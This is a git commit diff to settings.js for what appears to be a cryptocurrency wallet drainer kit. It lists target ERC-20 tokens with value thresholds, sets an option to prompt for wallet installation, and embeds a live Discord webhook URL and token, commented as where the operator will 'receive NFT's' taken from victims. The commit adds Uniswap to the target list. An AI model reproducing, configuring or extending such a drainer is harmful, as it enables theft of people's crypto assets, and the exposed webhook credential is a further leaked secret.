096ad5027ee539263e138369db3419cf484857c1
asalvz <114161010+asalvz@users.noreply.github.com>
2022-11-12 11:11:29 -0300

    Update settings.js

--- settings.js
+++ settings.js
@@ -24,7 +24,7 @@ const erc20list = {
   '0x00a5Dc07A0F8061e896F0Acdd47d352e49FD1a2c': 100, // DAI BSC Testnet (97)
   '0x348236484ce96A293E210260b90bBFb228D6d1Fc': 100, // USDT BSC Testnet (97)
   */
-   // Ethernet mainnet
+  // Ethernet mainnet
   '0x6B175474E89094C44Da98b954EedeAC495271d0F': 10, // DAI ethernet
   '0xdAC17F958D2ee523a2206206994597C13D831ec7': 10, // usdt
   '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48': 10, // usdc
@@ -32,9 +32,11 @@ const erc20list = {
   '0x95ad61b0a150d79219dcf64e1e6cc01f0b64c4ce': 10, // shib
   '0x514910771af9ca656af840dff83e8264ecf986ca': 10, // link
   '0xC18360217D8F7Ab5e7c516566761Ea12Ce7F9D72': 10, // ens
+  '0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984': 10, // uniswap
 }
 
 const installInNewWindow = true; // install wallet if not installed
+
 const discordWebhookURL = "https://discordapp.com/api/webhooks/1033079881254309979/o5hIIVApTV0UM2iPmf-0Q-AqxVVgQLhgO5OAJ5qmL7pGbyHb0tLXOC5c7f-QeoVIIBUh"; // put ur discord webhook url in here to receive NFT's
 const feedbackEnabled = true; // let enabled to receive webhooks
 /*
